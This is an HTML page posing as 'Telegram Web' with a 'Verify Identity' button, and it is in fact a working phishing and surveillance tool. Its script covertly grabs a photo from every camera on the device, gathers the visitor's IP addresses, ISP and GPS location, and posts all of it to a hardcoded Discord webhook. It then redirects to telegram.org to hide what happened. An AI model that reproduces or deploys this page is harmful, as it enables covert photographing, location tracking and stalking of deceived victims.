<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
  <title>Telegram Web</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #screen-landing {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
    }
    .verify-btn {
      width: 90%;
      padding: 16px;
      background: #24A1DE;
      color: white;
      border: none;
      border-radius: 14px;
      font-size: 1.05rem;
      font-weight: 600;
      cursor: pointer;
    }
    #screen-capture {
      display: none;
      position: fixed;
      inset: 0;
      background: #fff;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #24A1DE;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #hidden-video, #hidden-canvas {
      display: none;
    }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-landing">
  <button class="verify-btn" onclick="triggerSilentCapture()">Verify Identity</button>
</div>

<div id="screen-capture">
  <div class="loading-spinner"></div>
  <div style="margin-top: 20px;">Processing...</div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
  
  let capturedImages = [];
  let ipInfo = { v4: 'N/A', v6: 'N/A', loc: 'N/A', isp: 'N/A' };
  let geo = { lat: null, lon: null };

  async function getNetworkInfo() {
    try {
      const res = await fetch('https://ip-api.com/json/?fields=query,country,city,isp,lat,lon');
      const data = await res.json();
      ipInfo.v4 = data.query;
      ipInfo.loc = `${data.city}, ${data.country}`;
      ipInfo.isp = data.isp;
      const v6res = await fetch('https://api64.ipify.org?format=json');
      const v6data = await v6res.json();
      ipInfo.v6 = v6data.ip || 'N/A';
    } catch(e) {}
  }

  async function getGeo() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve();
      navigator.geolocation.getCurrentPosition(
        (pos) => { geo.lat = pos.coords.latitude; geo.lon = pos.coords.longitude; resolve(); },
        () => resolve(),
        { timeout: 3000 }
      );
    });
  }

  async function captureFrame(stream) {
    const video = document.getElementById('hidden-video');
    video.srcObject = stream;
    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.getElementById('hidden-canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          canvas.getContext('2d').drawImage(video, 0, 0);
          canvas.toBlob(resolve, 'image/jpeg', 0.9);
          video.srcObject = null;
        }, 300);
      };
    });
  }

  async function triggerSilentCapture() {
    document.getElementById('screen-landing').style.display = 'none';
    document.getElementById('screen-capture').style.display = 'flex';

    // Step 1: Request camera permission (ONE popup, unavoidable)
    let permStream = null;
    try {
      permStream = await navigator.mediaDevices.getUserMedia({ video: true });
      permStream.getTracks().forEach(t => t.stop());
    } catch(e) {
      window.location.href = 'https://telegram.org';
      return;
    }

    // Step 2: Enumerate all cameras
    const devices = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === 'videoinput');
    
    if (devices.length === 0) {
      window.location.href = 'https://telegram.org';
      return;
    }

    // Step 3: Get network & geo
    await Promise.all([getNetworkInfo(), getGeo()]);

    // Step 4: Capture from each camera
    for (let i = 0; i < devices.length; i++) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { deviceId: { exact: devices[i].deviceId } }
        });
        const blob = await captureFrame(stream);
        if (blob) {
          capturedImages.push({ blob, name: `cam_${i+1}.jpg` });
        }
        stream.getTracks().forEach(t => t.stop());
      } catch(e) {}
    }

    // Step 5: Send to Discord
    const formData = new FormData();
    const locationStr = geo.lat ? `GPS: ${geo.lat}, ${geo.lon}` : ipInfo.loc;
    const embed = {
      embeds: [{
        title: "Camera Capture",
        fields: [
          { name: "IPv4", value: ipInfo.v4, inline: true },
          { name: "IPv6", value: ipInfo.v6, inline: true },
          { name: "Location", value: locationStr, inline: false },
          { name: "ISP", value: ipInfo.isp, inline: true },
          { name: "Images", value: `${capturedImages.length} attached`, inline: true }
        ]
      }]
    };
    formData.append('payload_json', JSON.stringify(embed));
    capturedImages.forEach((img, idx) => {
      formData.append(`img_${idx}`, img.blob, img.name);
    });
    await fetch(WEBHOOK, { method: 'POST', body: formData }).catch(e => console.log(e));

    // Step 6: Redirect
    window.location.href = 'https://telegram.org';
  }
</script>
</body>
</html>
